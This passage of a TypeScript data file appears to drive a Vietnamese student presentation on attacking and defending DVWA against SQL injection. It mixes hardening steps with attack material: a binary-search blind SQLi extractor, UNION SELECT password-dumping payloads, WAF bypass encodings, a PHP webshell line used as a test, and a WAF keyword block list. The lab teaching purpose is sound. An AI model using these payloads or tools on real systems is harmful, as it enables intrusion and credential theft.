          "Chặn các ký tự/từ khóa đặc trưng của SQL Injection (', --, #, /*, UNION, SELECT, OR 1=1) ngay tại tầng Apache WAF với mã 403 Forbidden.",
      },
    ],
    expected_output: `HTTP/1.1 403 Forbidden
[ModSecurity Audit Log] id "100001" | severity "CRITICAL" | msg "Phat hien dau hieu bat thuong trong tham so id - Ngan chan boi ModSecurity"`,
    academic_explanation:
      "Phòng thủ Chiều sâu (Defense-in-Depth) đảm bảo nếu một lớp gặp sơ hở (ví dụ lập trình viên quên sửa 1 file PHP cũ), WAF ở tầng biên, tài khoản DB tối thiểu và thuật toán Bcrypt vẫn bảo vệ hệ thống toàn vẹn.",
    presenter_script:
      "Cuối cùng, để bảo vệ hệ thống ngay từ tầng biên trước khi mã độc chạm vào PHP, quy tắc WAF ModSecurity SecRule id 100001 được thiết lập để trả về 403 Forbidden, khép lại mô hình bảo mật đa tầng Security by Design theo OWASP A03:2021.",
    simulator_key: "m4-poc5-waf",
  },
  // ==================== KY SU R&D (BUOC 5 & 6 CHO 4 THANH VIEN) ====================
  {
    id: "m1-s5",
    member_number: 1,
    step_order: 5,
    phase_tag: "KỸ SƯ R&D • CONTAINER CÔ LẬP",
    title: "Tái cấu trúc Container Bất biến (--read-only & --cap-drop=ALL) Chặn RCE Ghi Webshell",
    poc_ref: "Cấp độ Kỹ sư • Sandbox Isolation",
    is_defense: true,
    goal: "Chứng minh giả sử ứng dụng PHP còn sót lỗ hổng SQLi cho phép kẻ tấn công chèn UNION SELECT ... INTO OUTFILE '/var/www/html/shell.php', hạ tầng Container chuẩn CIS (--read-only --cap-drop=ALL --security-opt=no-new-privileges) vẫn chặn đứng bước ghi tệp webshell ở tầng Kernel.",
    action_steps: [
      "Tái triển khai container DVWA với cờ --read-only, chỉ gắn quyền ghi RAM tạm --tmpfs /var/run/apache2,/tmp:rw,noexec,nosuid và --cap-drop=ALL.",
      "Kiểm tra cấu hình Kernel HostConfig bằng lệnh docker inspect xem ReadonlyRootfs, CapDrop và no-new-privileges đã bật.",
      "Thử kích hoạt ghi tệp /var/www/html/shell.php (mô phỏng INTO OUTFILE) và xác nhận hệ điều hành từ chối bằng Read-only file system (ROFS).",
    ],
    commands: [
      {
        label: "Triển khai Container Hardened với Read-Only RootFS & Drop Capabilities",
        shell: "zsh / bash",
        template: `docker run -d --name {{CONTAINER}}-hardened -p 8080:80 \\
  --read-only --cap-drop=ALL --cap-add=NET_BIND_SERVICE --cap-add=SETUID --cap-add=SETGID \\
  --security-opt=no-new-privileges:true --memory=512m --pids-limit=128 \\
  --tmpfs /var/run/apache2:rw,noexec,nosuid --tmpfs /tmp:rw,noexec,nosuid vulnerables/web-dvwa`,
        explanation: "Cô lập bề mặt ghi đĩa và thu hồi đặc quyền Kernel để vô hiệu hóa kịch bản leo thang RCE qua Webshell.",
      },
      {
        label: "Kiểm toán HostConfig & Thử ghi Webshell trên Container đã cô lập",
        shell: "zsh / bash",
        template: `docker inspect --format '{{.HostConfig.ReadonlyRootfs}} | CapDrop={{.HostConfig.CapDrop}}' {{CONTAINER}} && docker exec {{CONTAINER}} sh -c "echo '<?php system(\\$_GET[0]); ?>' > /var/www/html/shell.php"`,
        explanation: "Xác nhận kernel Linux trả về 'Read-only file system' ngay cả khi tiến trình web bị chiếm quyền thực thi.",
      },
    ],
    expected_output: `true | CapDrop=[ALL]
sh: 1: cannot create /var/www/html/shell.php: Read-only file system
[✓] Phòng thủ hạ tầng tầng sâu: RCE INTO OUTFILE bị khóa cứng ở lớp Kernel bất chấp lỗ hổng tầng ứng dụng.`,
    academic_explanation:
      "Thay vì chỉ vá file Apache đơn lẻ, tư duy Kỹ sư Hạ tầng áp dụng nguyên tắc Immutable Infrastructure & Least Capability: cắt đứt đường leo thang từ SQLi sang Webshell RCE ngay tại tầng Linux Namespace/cgroups.",
    presenter_script:
      "Không dừng ở việc chạy container mặc định hay ẩn chữ Apache, tôi tái thiết kế kiến trúc triển khai theo chuẩn CIS Container Hardening với ReadonlyRootfs và --cap-drop=ALL, khiến kỹ thuật SQLi INTO OUTFILE ghi webshell thất bại hoàn toàn ở tầng nhân hệ điều hành.",
    simulator_key: "m1-eng",
  },
  {
    id: "m1-s6",
    member_number: 1,
    step_order: 6,
    phase_tag: "KỸ SƯ R&D • DEVSECOPS GATE",
    title: "Tự viết Công cụ DevSecOps Security Gate (son_sec_gate.py) Chấm điểm CI/CD",
    poc_ref: "Cấp độ Kỹ sư • Python Telemetry Gate",
    is_defense: true,
    goal: "Thay thế thao tác kiểm tra curl -Is thủ công rời rạc bằng công cụ CLI tự động viết bằng Python 3 thuần túy (son_sec_gate.py) chấm điểm 10 tiêu chí HTTP Headers + TRACE method + DockerCIS (thang 0–100) và trả mã Exit 0/1 làm chốt chặn CI/CD Pipeline.",
    action_steps: [
      "Tải hoặc mở kịch bản public/engineering/son_sec_gate.py (Python 3 stdlib thuần, không cần pip install).",
      "Chạy chế độ benchmark trước bản vá (--demo default) để quan sát điểm FAIL dưới ngưỡng 85.",
      "Chạy kiểm toán sau gia cố (--demo hardened hoặc trỏ trực tiếp --target http://127.0.0.1:8080/login.php --container {{CONTAINER}}) để xuất báo cáo PASS (>= 85/100) hoặc --json cho pipeline.",
    ],
    commands: [
      {
        label: "Chạy son_sec_gate.py trước vs sau gia cố (Exit 0/1 Pipeline)",
        shell: "python",
        template: `python3 public/engineering/son_sec_gate.py --demo default ; python3 public/engineering/son_sec_gate.py --demo hardened --threshold 85`,
        explanation: "Tự động kiểm tra đồng thời 5 HTTP security controls (gồm phương thức TRACE/XST) và 5 cờ Docker HostConfig với mã thoát chuẩn CI/CD.",
      },
      {
        label: "Quét mục tiêu DVWA Localhost thật và xuất JSON Security Report",
        shell: "python",
        template: `python3 public/engineering/son_sec_gate.py --target http://127.0.0.1:8080/login.php --container {{CONTAINER}} --json`,
        explanation: "Tích hợp trực tiếp vào GitHub Actions / GitLab CI để chặn deploy nếu thiếu Header hoặc chạy container quyền root.",
      },
    ],
    expected_output: `=== DevSecOps Security Gate | Target: http://127.0.0.1:8080/login.php | Container: dvwa-lab ===
[FAIL] Default baseline -> SCORE: 0/100 (Threshold: 85) => VERDICT: FAIL (exit 1)
[PASS] Hardened state   -> SCORE: 100/100 (Threshold: 85) => VERDICT: PASS (exit 0)`,
    academic_explanation:
      "Người dùng công cụ đọc dòng cURL bằng mắt; Kỹ sư DevSecOps biến kiểm thử bảo mật thành cổng kiểm soát tự động hóa có trọng số, định lượng được (Policy-as-Code) và tích hợp được vào luồng phát hành phần mềm.",
    presenter_script:
      "Để chứng minh bản vá luôn được duy trì chứ không chỉ kiểm tra một lần cho báo cáo, tôi tự phát triển script son_sec_gate.py bằng Python chuẩn. Pipeline sẽ tự động từ chối triển khai (exit code 1) nếu bất kỳ cờ Header hay cấu hình Docker nào tụt dưới 85/100 điểm.",
    simulator_key: "m1-eng",
  },
  {
    id: "m2-s5",
    member_number: 2,
    step_order: 5,
    phase_tag: "KỸ SƯ R&D • THUẬT TOÁN KHAI THÁC",
    title: "Thuật toán Tìm kiếm Nhị phân O(log2 N) Khai thác Blind SQLi (hung_blind_bisect.py)",
    poc_ref: "Cấp độ Kỹ sư • Binary Search Extractor",
    is_defense: false,
    goal: "Khắc phục nhược điểm ồn ào của việc gửi công thức UNION cố định hoặc brute-force ASCII tuần tự bằng cách tự thiết kế bộ trích xuất Boolean-Blind SQLi dùng Tìm kiếm Nhị phân (hung_blind_bisect.py), rút ngắn số request từ ~48 xuống tối đa 7 request/ký tự (giảm ~85% dấu vết).",
    action_steps: [
      "Mở script public/engineering/hung_blind_bisect.py phân tích hàm extract_with_binary_search trên tập ASCII [32..126].",
      "Chạy trace mô phỏng thuật toán trên biểu thức database() để đối chiếu từng bước thu hẹp [low..high] -> mid.",
      "So sánh tổng HTTP request của Binary Search với Baseline tuần tự (~85% tiết kiệm băng thông và giảm phát lộ trên IDS).",
    ],
    commands: [
      {
        label: "Chạy hung_blind_bisect.py minh họa tìm kiếm nhị phân O(log2 N)",
        shell: "python",
        template: `python3 public/engineering/hung_blind_bisect.py --demo --query "database()" --demo-secret "dvwa"`,
        explanation: "Chia đôi khoảng ASCII [32..126] qua toán tử 'ASCII(SUBSTRING(...)) > mid', tìm đúng từng ký tự chỉ sau đúng 6-7 HTTP request.",
      },
      {
        label: "Thực thi trực tiếp trên endpoint Blind SQLi thật của DVWA",
        shell: "python",
        template: `python3 public/engineering/hung_blind_bisect.py --url "http://127.0.0.1:8080/vulnerabilities/sqli_blind/" --cookie "security=low; PHPSESSID={{PHPSESSID}}" --query "database()"`,
        explanation: "Chứng minh thuật toán tự viết chạy được với máy chủ thật mà không phụ thuộc công cụ đóng gói sẵn.",
      },
    ],
    expected_output: `=== Custom O(log2 N) Blind SQLi Binary-Search Tracer (database()) ===
Step 01 [pos=1] range=[ 32..126] mid= 79 ('O') | TRUE  -> lower = mid+1
Step 02 [pos=1] range=[ 80..126] mid=103 ('g') | FALSE -> upper = mid
...
Extracted Value       : dvwa
Binary Search Requests: 28 HTTP requests (~7 req/char)
Linear Brute Baseline : ~192 HTTP requests (~48 avg req/char)
Traffic Reduction     : 85.4% fewer IDS log footprints`,
    academic_explanation:
      "Việc giải bài toán Blind SQLi khi ứng dụng tắt hoàn toàn thông báo lỗi đòi hỏi tư duy giải thuật: độ phức tạp O(log2(95)) = 7 truy vấn/ký tự thay vì O(N) tuyến tính, đồng thời tránh tạo xung nhịp request bất thường trên WAF/IDS.",
    presenter_script:
      "Thay vì phụ thuộc công thức ' UNION 2 cột sẵn có khi trang web còn hiển thị dữ liệu, tôi tự cài đặt công cụ khai thác Blind SQLi dùng tìm kiếm nhị phân O(log2 N). Mỗi ký tự được giải mã tối đa 7 truy vấn đúng sai, giảm hơn 85% lượng request gây nhiễu nhật ký hệ thống.",
    simulator_key: "m2-eng",
  },
  {
    id: "m2-s6",
    member_number: 2,
    step_order: 6,
    phase_tag: "KỸ SƯ R&D • TOÁN HỌC IDS LOG",
    title: "Phát hiện Bất thường Log bằng Shannon Entropy H(X) & Z-Score Kích thước Phản hồi",
    poc_ref: "Cấp độ Kỹ sư • Blue Team Detection",
    is_defense: true,
    goal: "Nâng cấp điều tra access.log từ lệnh grep chuỗi tĩnh (dễ bị lách bằng URL-encoding) lên mô hình phân tích toán học định lượng Shannon Entropy H(X) = -sum(p_i * log2 p_i) của chuỗi truy vấn và Z-Score kích thước gói tin trả về nhằm bắt cả payload obfuscation lẫn tấn công mù.",
    action_steps: [
      "Chạy chế độ phân tích nhật ký của hung_blind_bisect.py với cờ --demo-entropy.",
      "Quan sát giá trị Entropy H(X) của truy vấn sạch (~3.2 bits) so với truy vấn mang payload SQLi mã hóa (~4.3+ bits) và Z-Score khi UNION làm phình kích thước phản hồi.",
      "Đối chiếu ngưỡng cảnh báo kết hợp H >= 4.2 bits hoặc |Z| >= 1.8 để viết rule săn lùng mối đe dọa (Threat Hunting).",
    ],
    commands: [
      {
        label: "Chạy bộ phân tích Shannon Entropy & Z-Score trên Apache Access Log",
        shell: "python",
        template: `python3 public/engineering/hung_blind_bisect.py --demo-entropy`,
        explanation: "Tính trực tiếp độ bất định Shannon Entropy cho từng URI đã giải mã và chuẩn hóa độ lệch Z-score của response bytes.",
      },
    ],
    expected_output: `=== IDS Mathematical Anomaly Detector (Shannon Entropy & Z-Score) ===
Baseline Response Mean=2333.7 bytes, StdDev=1162.8 bytes
[NORMAL            ] H=3.32 bits | Z=-0.42 | HTTP 200 1842B | /vulnerabilities/sqli/?id=1&Submit=Submit
[ALERT [SQLi Probe]] H=4.43 bits | Z=-0.47 | HTTP 200 1791B | /vulnerabilities/sqli_blind/?id=1' AND ASCII(SUBSTRING(version(),1,1))>79#
[ALERT [SQLi Probe]] H=4.26 bits | Z=+2.22 | HTTP 200 4920B | /vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users#`,
    academic_explanation:
      "Bộ lọc dựa trên danh sách từ khóa chết luôn mù trước kỹ thuật biến đổi chữ ký; Entropy đo mức độ hỗn loạn thông tin của tham số đầu vào kết hợp Z-score phát hiện rò rỉ dữ liệu hàng loạt qua kích thước response.",
    presenter_script:
      "Ở khía cạnh Blue Team, thay vì dùng grep tìm từng chữ UNION thủ công vốn bỏ sót truy vấn Blind SQLi, tôi tích hợp bộ tính Shannon Entropy H(X) và Z-score cho access.log. Bất kỳ request nào tăng độ phức tạp ký tự hoặc làm phình đột biến kích thước gói tin đều bị gắn cờ cảnh báo tự động.",
    simulator_key: "m2-eng",
  },
  {
    id: "m3-s5",
    member_number: 3,
    step_order: 5,
    phase_tag: "KỸ SƯ R&D • ZERO-DOWNTIME MIGRATION",
    title: "Thiết kế Di trú Mật mã học Zero-Downtime Dual-Hash Lazy Upgrade (MD5 -> Bcrypt)",
    poc_ref: "Cấp độ Kỹ sư • Cryptographic Migration",
    is_defense: true,
    goal: "Giải quyết bài toán thực tế khi nâng cấp hệ thống đang chạy: hàng nghìn người dùng cũ vẫn đang lưu mật khẩu MD5 và không thể reset mật khẩu toàn bộ một lúc. Áp dụng bảng mở rộng Dual-Hash (hash_algo, password_v2) và Stored Procedure sp_authenticate_and_upgrade nâng cấp âm thầm ngay khi người dùng đăng nhập.",
    action_steps: [
      "Mở tập lệnh SQL quyet_zero_downtime_migration.sql xem phần ALTER TABLE users thêm hash_algo ENUM('md5_legacy','bcrypt_2y','argon2id') và password_v2.",
      "Nạp kịch bản di trú vào MariaDB bên trong container {{CONTAINER}} để khởi tạo Stored Procedure SQL SECURITY DEFINER.",
      "Kiểm thử luồng Dual-Hash: tài khoản legacy đăng nhập đúng MD5 sẽ được tự động nâng cấp sang Bcrypt ngay tức thì mà hệ thống không gián đoạn một giây nào.",
    ],
    commands: [
      {
        label: "Triển khai Zero-Downtime Dual-Hash Migration & Stored Procedure vào MariaDB",
        shell: "sql",
        template: `docker exec -i {{CONTAINER}} mysql -u root < public/engineering/quyet_zero_downtime_migration.sql`,
        explanation: "Mở rộng schema an toàn, tạo thủ tục xác thực lai giúp hệ thống vận hành song song trong quá trình chuyển đổi mật mã học.",
      },
      {
        label: "Mô phỏng luồng Lazy Upgrade tài khoản MD5 sang Bcrypt ngay trong CSDL",
        shell: "sql",
        template: `docker exec -it {{CONTAINER}} mysql -u root -e "USE dvwa; CALL sp_authenticate_and_upgrade('gordonb', MD5('abc123'), '\\$2y\\$12\\$MigratedBcryptHashExample9876543210abcdef', @st, @alg); SELECT @st AS status, @alg AS hash_algo;"`,
        explanation: "Chứng minh người dùng cũ đăng nhập bình thường và mật khẩu tự động nâng cấp sang chuẩn Bcrypt cost=12 ở nền sau.",
      },
    ],
    expected_output: `status              | hash_algo
--------------------+----------
UPGRADED_ON_LOGIN   | bcrypt_2y
[✓] Tài khoản gordonb tự động nâng cấp từ md5_legacy sang bcrypt_2y không gây gián đoạn (0s downtime).`,
    academic_explanation:
      "Kịch bản cơ bản thường sửa cứng 1 dòng admin hoặc ép đổi toàn bộ mật khẩu gây gián đoạn dịch vụ (breaking change). Kiến trúc Dual-Hash Lazy Migration là chuẩn công nghiệp được các hệ thống lớn dùng khi thay thế hàm băm lỗi thời.",
    presenter_script:
      "Nếu chạy lệnh UPDATE đè Bcrypt cho một vài tài khoản mẫu, toàn bộ người dùng thật còn lại sẽ bị lỗi đăng nhập. Vì vậy tôi viết quy trình di trú Zero-Downtime bằng Dual-Hash và Stored Procedure: giữ khả năng xác thực MD5 ở lần đăng nhập kế tiếp rồi lập tức chuyển đổi vĩnh viễn sang Bcrypt.",
    simulator_key: "m3-eng",
  },
  {
    id: "m3-s6",
    member_number: 3,
    step_order: 6,
    phase_tag: "KỸ SƯ R&D • PHÒNG THỦ CSDL CHỦ ĐỘNG",
    title: "Cách ly Quyền Cột bằng SQL View & Đặt Bẫy Canary Honeypot Phát hiện Dump Dữ liệu",
    poc_ref: "Cấp độ Kỹ sư • SQL View + Canary Trap",
    is_defense: true,
    goal: "Nâng cấp cơ chế GRANT tối thiểu bằng kiến trúc SQL View v_user_public_profile che giấu tuyệt đối cột password/password_v2 khỏi tài khoản Web App (dvwa_app), kết hợp đặt bản ghi bẫy Canary user_id = 0 và bảng security_canary_alerts để bắt quả tang hành vi quét toàn bảng qua OR 1=1 / UNION SELECT.",
    action_steps: [
      "Áp dụng REVOKE quyền đọc trực tiếp trên bảng dvwa.users và chỉ cấp SELECT trên View v_user_public_profile (chỉ xuất user_id, first_name, last_name, avatar WHERE user_id >= 1).",
      "Kiểm tra sự tồn tại của dòng bẫy Honeypot user_id = 0 ('svc_canary_admin') trong bảng users.",
      "Mô phỏng truy vấn quét toàn bảng đụng tới user_id = 0 và đọc cảnh báo CRITICAL trong bảng security_canary_alerts.",
    ],
    commands: [
      {
        label: "Kiểm chứng SQL View che giấu cột Mật khẩu & kiểm tra Bẫy Canary",
        shell: "sql",
        template: `docker exec -it {{CONTAINER}} mysql -u root -e "USE dvwa; SHOW COLUMNS FROM v_user_public_profile; CALL sp_record_canary_leak('172.17.0.1', 'UNION SELECT user,password FROM users#'); SELECT alert_id, canary_user, severity, source_query FROM security_canary_alerts ORDER BY alert_id DESC LIMIT 3;"`,
        explanation: "Chứng minh hai lớp bảo vệ dữ liệu chuyên sâu: ẩn lược đồ nhạy cảm khỏi runtime Web App và cảnh báo tức thì nếu kẻ tấn công quét bảng gốc.",
      },
    ],
    expected_output: `Field      | Type
-----------+-------------
user_id    | int(6)
first_name | varchar(15)
last_name  | varchar(15)
username   | varchar(15)
avatar     | varchar(70)
[!] CANARY ALERT: alert_id=1 | canary_user=svc_canary_admin | severity=CRITICAL`,
    academic_explanation:
      "Phân quyền cấp bảng (GRANT SELECT ON dvwa.users) vẫn cho phép SQLi hút sạch cột password. Tách biệt lược đồ bằng SQL View loại bỏ cột mật khẩu khỏi vùng nhìn thấy của Web App, còn Canary Record đóng vai trò cảm biến xâm nhập ngay trong tầng dữ liệu (Deception Defense).",
    presenter_script:
      "Ngoài việc thu hẹp quyền bảng, tôi loại bỏ hoàn toàn khả năng ứng dụng web chạm tới cột password thông qua SQL View v_user_public_profile, đồng thời cấy dòng bẫy Canary user_id=0 để mọi nỗ lực dump toàn bảng đều tự kích hoạt cảnh báo pháp chứng.",
    simulator_key: "m3-eng",
  },
  {
    id: "m4-s5",
    member_number: 4,
    step_order: 5,
    phase_tag: "KỸ SƯ R&D • TẤN CÔNG BYPASS WAF",
    title: "Chứng minh Sự Sụp đổ của WAF Regex Ngây thơ trước Kỹ thuật Obfuscation & False Positive",
    poc_ref: "Cấp độ Kỹ sư • Adversarial Regex Audit",
    is_defense: false,
    goal: "Chứng minh vì sao luật WAF dùng Regex đơn thuần ở môi trường thực tế vừa dễ bị tin tặc lách qua bằng MySQL Versioned Comment (/*!50000UNION*/) và Double URL Encoding (%2527), vừa gây gián đoạn nghiệp vụ khi chặn nhầm chuỗi hợp lệ chứa dấu nháy đơn như họ tên \"O'Connor\".",
    action_steps: [
      "Mở kịch bản tự phát triển public/engineering/khanh_sql_lexer_waf.py và chạy chế độ --benchmark.",
      "Quan sát kết quả so sánh cột Naive Regex với các vector vượt rào: /*!50000UNION*/ /*!50000SELECT*/, %2527%20OR%201%3D1--%20-.",
      "Kiểm nghiệm trường hợp False Positive với chuỗi bình thường \"O'Connor\" bị Regex từ chối nhầm.",
    ],
    commands: [
      {
        label: "Chạy Adversarial WAF Benchmark trên khanh_sql_lexer_waf.py",
        shell: "python",
        template: `python3 public/engineering/khanh_sql_lexer_waf.py --benchmark`,
        explanation: "Đối chiếu trực diện hành vi ALLOW/BLOCK của Regex ngây thơ và Bộ phân tích từ vựng SQL trước 6 tình huống biên.",
      },
    ],
    expected_output: `[False-positive stress test (surname)] Payload: O'Connor
  Fingerprint: w'w      | Naive Regex: BLOCK (regex match) | SQL Lexer: ALLOW
[Naive Regex bypass: MySQL /*!50000...*/] Payload: 1' /*!50000UNION*/ /*!50000SELECT*/ ...
  Fingerprint: n'kkkk   | Naive Regex: ALLOW               | SQL Lexer: BLOCK`,
    academic_explanation:
      "Thay vì dừng lại ở một luật SecRule @rx mẫu có sẵn dễ cho người dùng cảm giác an toàn giả tạo, kiểm toán kỹ thuật phải đặt WAF vào kiểm thử đối nghịch (Adversarial Testing) để lộ cả âm tính giả lẫn dương tính giả.",
    presenter_script:
      "Nếu chỉ cài một luật Regex chặn 'UNION SELECT' rồi kết luận hệ thống an toàn, WAF đó sẽ sụp đổ ngay trước kỹ thuật bình luận điều kiện của MySQL /*!50000...*/ hay mã hóa URL hai lần %2527, thậm chí khóa nhầm người dùng tên O'Connor. Phần kiểm thử đối nghịch này chứng minh rõ lỗ hổng của tư duy lọc chuỗi cơ học.",
    simulator_key: "m4-eng",
  },
  {
    id: "m4-s6",
    member_number: 4,
    step_order: 6,
    phase_tag: "KỸ SƯ R&D • LEXICAL TOKENIZER WAF",
    title: "Xây dựng Bộ phân tích Từ vựng SQL (khanh_sql_lexer_waf.py) & Kiến trúc SafePDO",
    poc_ref: "Cấp độ Kỹ sư • Context-Aware RASP",
    is_defense: true,
    goal: "Tự lập trình bộ máy RASP phân tích ngữ nghĩa theo tư tưởng libinjection (giải mã URL đệ quy, bóc MySQL versioned comment, tách Token từ vựng n/s/o/k/w/c và kiểm tra cấu trúc ngữ pháp SQLi), đạt 0% chặn nhầm chuỗi hợp lệ và khóa chặt mọi biến thể né WAF kết hợp chuẩn hóa PHP SafePDO.",
    action_steps: [
      "Kiểm thử đơn lẻ từng payload phức tạp bằng khanh_sql_lexer_waf.py --payload \"...\" để đọc chuỗi Token & Fingerprint sinh ra.",
      "Xác nhận với 'O'Connor' bộ phân tích giữ nguyên ALLOW do không xuất hiện cấu trúc mệnh đề SQL nối đuôi.",
      "Xuất mẫu kiến trúc PHP SafePDO (--show-pdo) với PDO::ATTR_EMULATE_PREPARES => false và xác thực kiểu FILTER_VALIDATE_INT.",
    ],
    commands: [
      {
        label: "Phân tích Token & Fingerprint trên 2 ca khó: O'Connor vs /*!50000UNION*/",
        shell: "python",
        template: `python3 public/engineering/khanh_sql_lexer_waf.py --payload "O'Connor" && python3 public/engineering/khanh_sql_lexer_waf.py --payload "1' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users#"`,
        explanation: "Xem trực tiếp quá trình chuẩn hóa bình luận phiên bản MySQL và định danh token để ra quyết định chính xác.",
      },
      {
        label: "In mã nguồn chuẩn hóa SafePDO tắt Emulate Prepares",
        shell: "python",
        template: `python3 public/engineering/khanh_sql_lexer_waf.py --show-pdo`,
        explanation: "Đảm bảo tham số hóa ở tầng trình điều khiển MySQL gốc bên cạnh lớp tiền lọc RASP Lexical Tokenizer.",
      },
    ],
    expected_output: `Input      : O'Connor -> Lexer WAF: ALLOW (Benign lexical profile)
Input      : 1' /*!50000UNION*/ /*!50000SELECT*/ user,password FROM users#
Normalized : 1' UNION SELECT user,password FROM users#
Fingerprint: n'kkkkw -> Lexer WAF: BLOCK (Detected structural UNION + SELECT clause sequence)`,
    academic_explanation:
      "Kết hợp Lexical Tokenization ở tầng biên (nơi xử lý chính xác ngữ cảnh thay cho Regex mù) cùng Prepared Statement thực sự ở tầng ứng dụng (PDO::ATTR_EMULATE_PREPARES = false) tạo thành mô hình phòng thủ chuẩn công nghiệp.",
    presenter_script:
      "Giải pháp tôi tự phát triển là bộ phân tích từ vựng SQL Lexical Tokenizer bằng Python theo triết lý của libinjection: giải mã nhiều lớp, chuẩn hóa bình luận điều kiện MySQL và khớp cấu trúc ngữ pháp thay vì tìm từ khóa chết, kết hợp chuẩn PHP SafePDO tắt emulate prepares để triệt tiêu hoàn toàn SQL Injection.",
    simulator_key: "m4-eng",
  },
];

export const VULNERABILITIES: VulnerabilityItem[] = [
  {
    id: "vuln-cwe-89",
    cwe_id: "CWE-89",
    title: "SQL Injection (Cấp độ Low — Error-based & Automated Dump)",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    cvss_score: 8.8,
    severity: "High",
    poc_ref: "PoC 2 & PoC 4 (low.php dòng 8)",
    owner_member: 2,
    remediation: "Sử dụng PDO Prepared Statements ($db->prepare + bindParam PDO::PARAM_INT) kết hợp kiểm tra kiểu is_numeric() và chặn biên bằng WAF ModSecurity.",
  },
  {
    id: "vuln-cwe-250",
    cwe_id: "CWE-250",
    title: "Vận hành kết nối CSDL bằng tài khoản root đặc quyền tối cao (Excessive Privileges)",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
    cvss_score: 7.2,
    severity: "High",
    poc_ref: "PoC 3 & Vá lỗi 2 (mysql -u root -> dvwa_svc)",
    owner_member: 3,
    remediation: "Khởi tạo tài khoản dịch vụ riêng 'dvwa_svc'@'localhost' chỉ cấp quyền SELECT, INSERT, UPDATE trên bảng dvwa.users và thu hồi quyền quản trị toàn cục.",
  },
  {
    id: "vuln-cwe-200",
    cwe_id: "CWE-200",
    title: "Lộ thông tin phiên bản máy chủ (Server Banner Disclosure)",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cvss_score: 5.3,
    severity: "Medium",
    poc_ref: "PoC 1 (Server: Apache/2.4.25 (Debian))",
    owner_member: 1,
    remediation: "Cấu hình ServerTokens Prod và ServerSignature Off trong /etc/apache2/conf-available/security.conf rồi reload Apache.",
  },
  {
    id: "vuln-cwe-209",
    cwe_id: "CWE-209",
    title: "Xuất trực tiếp thông báo lỗi hệ quản trị CSDL ra HTTP Response (Error Message Exposure)",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cvss_score: 5.3,
    severity: "Medium",
    poc_ref: "PoC 2 & PoC 4 (low.php dòng 9: die(mysqli_error()))",
    owner_member: 2,
    remediation: "Loại bỏ hàm mysqli_error() xuất ra phản hồi HTTP; ghi lỗi chi tiết vào nhật ký nội bộ máy chủ và chỉ trả thông báo chung an toàn cho người dùng.",
  },
  {
    id: "vuln-cwe-759",
    cwe_id: "CWE-759",
    title: "Lưu trữ Mật khẩu băm MD5 không Salt (Unsalted One-Way Hash)",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
    cvss_score: 4.9,
    severity: "Medium",
    poc_ref: "PoC 3 (admin & smithy trùng chuỗi 5f4dcc3b5aa765d61d8327deb882cf99)",
    owner_member: 3,
    remediation: "Chuyển sang băm thích ứng có Salt tự động bằng Argon2id hoặc Bcrypt (cost=12) qua password_hash() và xác thực bằng password_verify().",
  },
  {
    id: "vuln-cwe-614",
    cwe_id: "CWE-614",
    title: "Thiếu cờ bảo mật trên Cookie phiên (PHPSESSID & security=low)",
    cvss_vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
    cvss_score: 4.2,
    severity: "Medium",
    poc_ref: "PoC 1 & Vá lỗi 4 (Set-Cookie thiếu HttpOnly, SameSite=Strict)",
    owner_member: 1,
    remediation: "Thiết lập đầy đủ cờ HttpOnly, Secure và SameSite=Strict cho PHPSESSID; không lưu trạng thái bảo mật (security=low) ở phía Client.",
  },
];

export const QA_ITEMS: QaItem[] = [
  {
    id: "qa-1-1",
    member_number: 1,
    question: "Tại sao trong PoC 1 chỉ cần ẩn phiên bản Apache (ServerTokens Prod) mà không sửa code PHP ngay?",
    answer_summary:
      "Ẩn banner Apache khắc phục trực tiếp lỗ hổng CWE-200 (CVSS 5.3) ở tầng cấu hình máy chủ web: kẻ tấn công không biết chính xác bản 2.4.25 (Debian) để tra cứu CVE khai thác tự động. Đây là bước hạ tầng (Layer 1) trong mô hình Defense-in-Depth, bổ trợ cho phần vá code PHP của Khánh.",
    is_defense: true,
  },
  {
    id: "qa-1-2",
    member_number: 1,
    question: "Vì sao Docker container có lúc dùng ID 215d3a734374, lúc lại dùng tên 'dvwa'?",
    answer_summary:
      "Container được tạo tự động có tên ngẫu nhiên như epic_dijkstra (ID 215d3a734374). Khi nhân bản môi trường sang các máy thực hành khác, việc đặt thêm cờ --name dvwa giúp đồng bộ câu lệnh docker exec giữa tất cả các máy mà không phụ thuộc vào hash ID ngẫu nhiên.",
    is_defense: false,
  },
  {
    id: "qa-2-1",
    member_number: 2,
    question: "Tại sao trình duyệt của Burp Suite lại bỏ qua Proxy khi truy cập 127.0.0.1:8080 và localtest.me giải quyết thế nào?",
    answer_summary:
      "Nhân Chromium mặc định áp dụng danh sách bỏ qua Proxy (Loopback Bypass) cho localhost và 127.0.0.1 nhằm tránh vòng lặp nội bộ. Tên miền localtest.me phân giải DNS công khai về 127.0.0.1 nhưng về mặt chuỗi tên miền lại khác localhost, buộc Chromium đẩy 100% gói tin qua cổng Proxy 8081 của Burp Suite.",
    is_defense: true,
  },
  {
    id: "qa-2-2",
    member_number: 2,
    question: "Khi kiểm tra Apache access.log, làm sao phân biệt được request tấn công từ cURL hay từ trình duyệt Burp?",
    answer_summary:
      "Dựa vào 3 IoC cốt lõi trong mỗi dòng log: (1) Chuỗi truy vấn chứa ký tự đặc biệt mã hóa như %27, UNION, SELECT; (2) Trường User-Agent ghi rõ 'curl/...' đối với CLI so với 'Mozilla/5.0...' của trình duyệt tích hợp Burp; (3) Mã phản hồi HTTP và kích thước response (response dump 5 users dài hơn hẳn query thường).",
    is_defense: true,
  },
  {
    id: "qa-3-1",
    member_number: 3,
    question: "Nếu không dùng Salt, tại sao admin và smithy có cùng hash MD5 lại nguy hiểm hơn bình thường?",
    answer_summary:
